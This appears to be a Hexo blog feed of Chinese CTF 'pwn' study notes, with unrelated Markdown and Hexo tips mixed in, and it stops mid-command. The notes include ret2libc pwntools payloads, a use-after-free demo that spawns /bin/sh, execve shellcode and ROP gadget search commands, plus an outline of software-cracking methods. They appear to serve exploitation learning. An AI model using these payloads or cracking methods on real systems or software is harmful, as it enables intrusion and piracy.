      <content type="html"><![CDATA[<h1 id="关于ret2libc-中的plt-got"><a href="#关于ret2libc-中的plt-got" class="headerlink" title="关于ret2libc 中的plt/got"></a>关于ret2libc 中的plt/got</h1><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p><ul><li>使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；*<br><img src="/2018/08/28/Introduction to pwn 1.3--ret2libc practice/pwn-入门1-3-plt-got/write.png" alt="图四">    <img src="/2018/08/28/Introduction to pwn 1.3--ret2libc practice/pwn-入门1-3-plt-got/wrgot.png" alt="图五"></li></ul><h2 id="plt-与-got"><a href="#plt-与-got" class="headerlink" title="plt 与 got"></a>plt 与 got</h2><p>文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的）</p><p>由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。</p><h1 id="ret2libc的实现"><a href="#ret2libc的实现" class="headerlink" title="ret2libc的实现"></a>ret2libc的实现</h1><ol><li>文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出；</li></ol><figure class="image-box">                <img src="/2018/08/28/Introduction to pwn 1.3--ret2libc practice/pwn-入门1-3-plt-got/ida.png" alt="图一](pwn-入门1-3-plt-got/checksec.png)  ![图二" title="" class="">                <p>图一](pwn-入门1-3-plt-got/checksec.png)  ![图二</p>            </figure><ol start="2"><li>查看应用调用函数plt表，<code>objdump -d -M intel -j .plt pwnme</code>可以看到没有调用system，需要我们利用其它已调用的来泄露；</li></ol><figure class="image-box">                <img src="/2018/08/28/Introduction to pwn 1.3--ret2libc practice/pwn-入门1-3-plt-got/plt.png" alt="图三" title="" class="">                <p>图三</p>            </figure><ol start="3"><li>这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址；</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure><ol start="4"><li>构造payload泄露write函数的实际地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4)</span><br></pre></td></tr></table></figure><ol start="4"><li>泄露libc中的system与/bin/sh地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure><ol start="5"><li>构造payload </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.3--UAF</title>
      <link href="/2018/08/28/Introduction-to-pwn2-3--UAF/"/>
      <url>/2018/08/28/Introduction-to-pwn2-3--UAF/</url>
      <content type="html"><![CDATA[<h1 id="堆的UAF-use-after-free-利用"><a href="#堆的UAF-use-after-free-利用" class="headerlink" title="堆的UAF(use after free)利用"></a>堆的UAF(use after free)利用</h1><p><em>学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，<br>先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，<br>只能看了下pwn的tips，开始现学现卖。</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；<br>而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。</p><ul><li>根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</li></ul><h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char command[])</span><br><span class="line">&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line">void echo(char content[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s&quot;,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);</span><br><span class="line">    p1[3]=echo;</span><br><span class="line">    p1[3](&quot;hello world\n&quot;);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](&quot;hello again\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p2);</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](&quot;/bin/sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终运行效果：</p><figure class="image-box">                <img src="/2018/08/28/Introduction-to-pwn2-3--UAF/Introduction" alt="result" title="to" class="">                <p>to</p>            </figure><p><em>漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程</em></p><p>学习借鉴文章来源：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.2</title>
      <link href="/2018/08/28/Introduction%20to%20pwn%201.2/"/>
      <url>/2018/08/28/Introduction%20to%20pwn%201.2/</url>
      <content type="html"><![CDATA[<h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><h2 id="ret2text-amp-ret2shellcode"><a href="#ret2text-amp-ret2shellcode" class="headerlink" title="ret2text &amp; ret2shellcode"></a>ret2text &amp; ret2shellcode</h2><p>当程序中存在打印flag的地址或是可以得到shell的地址，我们就可以想办法覆盖返回地址到其地址处。也就是ret2text.</p><p>若程序中有明显的溢出且无保护措施，我们可以自己写shellcode并覆盖返回地址至shellcode处改变程序流程。不过要注意写入shellcode的区域要有可执行权限，否则写了也白写。关于shellcode的布置可以查看<br><a href="&quot;https://www.siriuswhiter.tk/2018/07/26/the-art-0f-deploying-shellcode/&quot;">shellcode的布置</a></p><p>查看程序段的可读写执行情况：</p><ol><li><p>gdb：vmmap</p></li><li><p>./file &amp;  (后台运行，返回pid0）<br> cat  /proc/pid0/maps</p></li></ol><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>栈不可执行开启的情况下，我们可以在栈上写入gadgets，使通过系统中断执行系统调用，从而达到获取shell的目的；</p><p>查找gadget的方法：</p><pre><code>ROPgadget --binary ./fileROPgadget --binary file  --only &apos;pop|ret&apos; | grep eax     ROPgadget --binary file  --opcode cd80c3（int 0x80 ; ret ）ROPgadget --binary file  --string &apos;/bin/sh&apos;</code></pre><p><em><a href="syscalls.kernelgrok.com" title="src">32位linux下的系统调用</a>.</em><br><em><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" title="src" target="_blank" rel="noopener">64位linux下的系统调用</a>.</em></p><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>程序不是静态编译，通常就不会有int 0x80; ret2syscall 就无法实现，因而使用ret2libc。</p><h3 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h3><p>ASLR使得每次载入的函数地址（base）都不同；实际地址 Address = base +offset</p><p><em>若地址为 0xf…  则其一般为实际地址；</em></p><p>而各函数offset在libc库中是固定的；</p><ul><li>查看libc库版本：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd  ./file</span><br></pre></td></tr></table></figure><ul><li>寻找偏移地址 ：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a  /lib32/libc.so.6 | grep gets@</span><br></pre></td></tr></table></figure><ul><li>目标是寻找libc 的 base :</li></ul><p>1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset</p><p>2.从stack残渣中获取libc地址信息</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>简而言之就是程序在未调用过该函数时，其got地址处的值不是其真实地址；当程序调用一次该函数后，真实地址才会被初始化，此时got地址处的值才是真实地址。</p><h2 id="给文件加载目标libc的方法："><a href="#给文件加载目标libc的方法：" class="headerlink" title="给文件加载目标libc的方法："></a>给文件加载目标libc的方法：</h2><ol><li>加载环境变量:(64为UBUNTU调试32位程序会无法加载)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=`pwd`       #当前目录为加载目录</span><br><span class="line">export LD_PRELOAD= libc            #加载本地pwn题目下的libc</span><br><span class="line"></span><br><span class="line">unset LD_PRELOAD                   #调试完删除环境变量</span><br></pre></td></tr></table></figure><ol start="2"><li>exp调试时使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = process([‘./bin‘],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br></pre></td></tr></table></figure><h2 id="需要注意的函数"><a href="#需要注意的函数" class="headerlink" title="需要注意的函数"></a>需要注意的函数</h2><p>read   读取截至\x00，\n不会自动忽略<br>gets   </p><p>write<br>puts   截止符为\x00，没有截断可以泄露，最后会自动加上\n</p><h2 id="源码级别的调试"><a href="#源码级别的调试" class="headerlink" title="源码级别的调试"></a>源码级别的调试</h2><p>glibc 源码下载：<a href="http://mirrors.ustc.edu.cn/gnu/libc/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/gnu/libc/</a></p><p>下载源码， tar解压</p><p>进入源码文件，mkdir build ; cd build </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; ../configure --prefix=/home/sirius/tools/source/glibc-2.23/64</span><br><span class="line"></span><br><span class="line">make -j8</span><br><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>在程序编译时可以直接更改ld为编译完的libc，这样在调试时可以直接调用编译出来的libc，也就可以直接调试源码。</p><p>调试源码除了使用gdb以外，更方便的方法就是使用linux 下的vscode，可以像windows下一样直接对源码进行调试。</p><p>当然也可以使用gdbtui，但是不是特别的好用，加了pwndbg插件后显示会出现乱码。</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>软件保护/软件破解 及对抗</title>
      <link href="/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/"/>
      <url>/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/</url>
      <content type="html"><![CDATA[<h1 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h1><h2 id="简单算法注册保护："><a href="#简单算法注册保护：" class="headerlink" title="简单算法注册保护："></a>简单算法注册保护：</h2><p>输入用户名序列号，计算并检测序列号；</p><h2 id="简单算法注册保护的对抗："><a href="#简单算法注册保护的对抗：" class="headerlink" title="简单算法注册保护的对抗："></a>简单算法注册保护的对抗：</h2><p>①修改关键指令：暴力破解；patcher<br>②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机<br>③还原本身算法；keygen</p><h2 id="复杂算法注册保护："><a href="#复杂算法注册保护：" class="headerlink" title="复杂算法注册保护："></a>复杂算法注册保护：</h2><p>通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等；</p><h2 id="复杂算法注册保护的对抗："><a href="#复杂算法注册保护的对抗：" class="headerlink" title="复杂算法注册保护的对抗："></a>复杂算法注册保护的对抗：</h2><p>①patch<br>②补丁修改公钥，使用自己的公钥对；</p><h2 id="网络加密及硬件加密："><a href="#网络加密及硬件加密：" class="headerlink" title="网络加密及硬件加密："></a>网络加密及硬件加密：</h2><p>本质上与本地加密相同/运行前检测？？</p><h2 id="网络加密及硬件加密的对抗："><a href="#网络加密及硬件加密的对抗：" class="headerlink" title="网络加密及硬件加密的对抗："></a>网络加密及硬件加密的对抗：</h2><p>①patch<br>②模拟与远程端的通信，及模拟执行；<br>③使用中转程序，从服务器获得远程执行结果；</p><h2 id="复杂系统注册保护："><a href="#复杂系统注册保护：" class="headerlink" title="复杂系统注册保护："></a>复杂系统注册保护：</h2><p>以上内容混杂</p><p>附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测</p><h1 id="软件破解及对抗"><a href="#软件破解及对抗" class="headerlink" title="软件破解及对抗"></a>软件破解及对抗</h1><h2 id="程序分析及对抗："><a href="#程序分析及对抗：" class="headerlink" title="程序分析及对抗："></a>程序分析及对抗：</h2><ul><li>代码变形mutation；</li><li>代码膨胀expansion；</li><li>花指令；</li><li>代码乱序；</li><li>平坦化；</li></ul><h2 id="程序调试及对抗："><a href="#程序调试及对抗：" class="headerlink" title="程序调试及对抗："></a>程序调试及对抗：</h2><ul><li>系统API检测程序是否处于被调试状态；</li><li>检测调试器窗口信息、状态码；</li><li>检测调试器驱动，符号；</li><li>程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）；</li><li>利用驱动接管本身程序的中断，阻止被调试器接管；</li><li>利用驱动修改内核参数，阻止程序被调试；</li><li>双进程反调试；</li></ul><h2 id="程序修改及对抗："><a href="#程序修改及对抗：" class="headerlink" title="程序修改及对抗："></a>程序修改及对抗：</h2><p>修改：文件补丁技术及工具；<br>对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等；</p><p><em>dnspy：.NET程序逆向工具</em></p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo Essay Writing</title>
      <link href="/2018/08/15/hexo-essay-writing/"/>
      <url>/2018/08/15/hexo-essay-writing/</url>
      <content type="html"><![CDATA[<ol><li>打开git,进入MyBlog目录；</li><li>输入 <code>hexo new &quot;essay-name&quot;</code>；</li><li>打开source文件夹，找到 essay-name.md，使用markdown语法写作；</li><li>执行命令 <code>/ hexo clean / hexo generate/ hexo deploy</code>(简单点： <code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>)；</li><li>over；</li></ol><p><strong>假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。</strong></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Markdown standard</title>
      <link href="/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h1 id="MarkDown-v1-0"><a href="#MarkDown-v1-0" class="headerlink" title="MarkDown v1.0"></a>MarkDown v1.0</h1><h2 id="1-1-全局规范"><a href="#1-1-全局规范" class="headerlink" title="1.1 全局规范"></a>1.1 全局规范</h2><p><a name="top"></a></p><ul><li>MarkDown 文件使用‘.md’结尾 （<strong>小写字母</strong>)</li></ul><h2 id="格式规范"><a href="#格式规范" class="headerlink" title="格式规范"></a>格式规范</h2><h3 id="标题结构格式"><a href="#标题结构格式" class="headerlink" title="标题结构格式"></a>标题结构格式</h3><p>1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开<br>2.’#’号和文字之间’一个空格’连接<br>3.标题层级最多六级 ‘#’到’######’</p><h3 id="加强和强调规范"><a href="#加强和强调规范" class="headerlink" title="加强和强调规范"></a>加强和强调规范</h3><p>一般统一使用第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*emphasize*</span><br><span class="line">_emphasize_</span><br></pre></td></tr></table></figure><p>使用’~~’给文字添加删除线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~strikethrough~~</span><br></pre></td></tr></table></figure></p><h3 id="代码块规范"><a href="#代码块规范" class="headerlink" title="代码块规范"></a>代码块规范</h3><ul><li>行内代码使用’一对波浪号’如：<code>hello world!</code></li><li>块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &apos;看源码之三个波浪号&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><pre><code>&lt;?php    echo &apos;看源码之四空格缩进&apos;;?&gt;</code></pre><h3 id="列表写法"><a href="#列表写法" class="headerlink" title="列表写法"></a>列表写法</h3><ul><li>列号’1.’或者’*’后内容用空格隔开</li><li>列表块前后’整行隔开’ 如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Windows  </span><br><span class="line">2. Mac</span><br><span class="line">3. iOS</span><br><span class="line">    * iPhone</span><br><span class="line">    * iPad</span><br><span class="line">4. Android</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ol><li>Windows  </li><li>Mac</li><li>iOS<ul><li>iPhone</li><li>iPad</li></ul></li><li>Android</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br><span class="line">    1. v3.2</span><br><span class="line">    2. v4.1</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ul><li>Windows  </li><li>Mac</li><li>iOS</li><li>Android<ol><li>v3.2</li><li>v4.1</li></ol></li></ul><h3 id="其他标签规范"><a href="#其他标签规范" class="headerlink" title="其他标签规范"></a>其他标签规范</h3><p>链接和email</p><p>Inline：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An [example](http://url.com/ &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>实现效果：<br>An <a href="http://url.com/" title="title" target="_blank" rel="noopener">example</a></p><p>引用样式标签（titles are optional）:</p><pre><code>An [example][id].Then,anywhereelse in the doc,define the link:[id]:http://example.com/ &quot;title&quot;</code></pre><p>Email:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An email &lt;example@example.com&gt; link.</span><br></pre></td></tr></table></figure><p>插图<br>Inline(titles are optional)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![alt text](/path/img.jpg &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>引用式插图：</p><pre><code>![alt text][id][id]:/url/to/img.jpg &quot;title&quot;</code></pre><p>引用块及嵌套</p><blockquote><p>Email-style angle brackets<br>are used for blockquotes.</p></blockquote><blockquote><blockquote><p>And, they can be nested.</p></blockquote></blockquote><blockquote><h4 id="Headers-in-blockquotes"><a href="#Headers-in-blockquotes" class="headerlink" title="Headers in blockquotes"></a>Headers in blockquotes</h4><ul><li>You can quote a list.</li><li>Etc.</li></ul></blockquote><p>内联代码</p><p><code>&lt;code&gt;</code> 段落中的用法</p><p>也可以 <code>`代码中包含波浪号`</code>.<br>代码块</p><p>Indent every line of a code block by at least 4 spaces or 1 tab.<br>代码的每行都最少用4个空格或者一个制表符(tab)</p><p>我是普通文本块</p><pre><code>我是一个预格式化的代码块.</code></pre><p>水平分割线<br>三个<code>连字符-</code>:</p><hr><h3 id="表格规范"><a href="#表格规范" class="headerlink" title="表格规范"></a>表格规范</h3><p>一个简单的表格看起来如下：</p><table><thead><tr><th>第一个头部</th><th>第二个头部</th><th>第三个头部</th></tr></thead><tbody><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr></tbody></table><p>每列的对齐可以通过在分割线上添加冒号来实现：</p><table><thead><tr><th style="text-align:left">第一个头部</th><th style="text-align:center">第二个头部</th><th style="text-align:right">第三个头部</th></tr></thead><tbody><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr></tbody></table><h3 id="页内锚标记"><a href="#页内锚标记" class="headerlink" title="页内锚标记"></a>页内锚标记</h3><ul><li><a href="#11全局规范">点我跳转到顶部</a>   // 利用 <code>#</code>,<code>##</code> 生成 <code>id</code> 锚标签  </li><li><a href="#top">另一种锚标记</a> // 利用 <code>&lt;a name=&quot;top&quot;&gt;&lt;/a&gt;</code></li></ul><hr><p>附：参考 Hello-World.md 源码，<em>注意换行的使用</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Hello-World</span><br><span class="line"></span><br><span class="line">这是一个范例文件格式</span><br><span class="line">我是普通换行</span><br><span class="line"></span><br><span class="line">## 我是&lt;h2&gt;标题</span><br><span class="line"></span><br><span class="line">我是`&lt;h2&gt;`的内容</span><br><span class="line"></span><br><span class="line">## 我是&lt;h3&gt;标题</span><br><span class="line"></span><br><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.1</title>
      <link href="/2018/08/13/Introduction%20to%20pwn%201.1/"/>
      <url>/2018/08/13/Introduction%20to%20pwn%201.1/</url>
      <content type="html"><![CDATA[<h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol><li>stack：局部变量</li><li>heap: 动态分配内存的变量（malloc/new）</li><li>bss section: 全局化的未初始化的变量</li><li>data section: 全局化的已初始化的变量<ul><li>rodata: （只读data段）全局化的静态变量（const）</li></ul></li></ol><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">char *d = malloc(16);    //heap</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>2.一系列步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure><p>3.带入调用shellcode的程序test.c</p><pre><code>#include  &quot;code.h&quot;typedef int(*CODE)();int main(){    ((CODE)shellcode)();}Run Shellcode: gcc test.c -o test -m32 -zexexstack       </code></pre><h3 id="编译tips"><a href="#编译tips" class="headerlink" title="编译tips"></a>编译tips</h3><p>64位机上编译上面程序需要强制32位编译，用gcc -m32 、as –32选项</p><p>AT&amp;T：<br>as easy.s  -o easy.o –32<br>ld easy.o -o easy -m elf_i386</p><p>INTEL:<br>nasm srop.asm -f elf64<br>ld 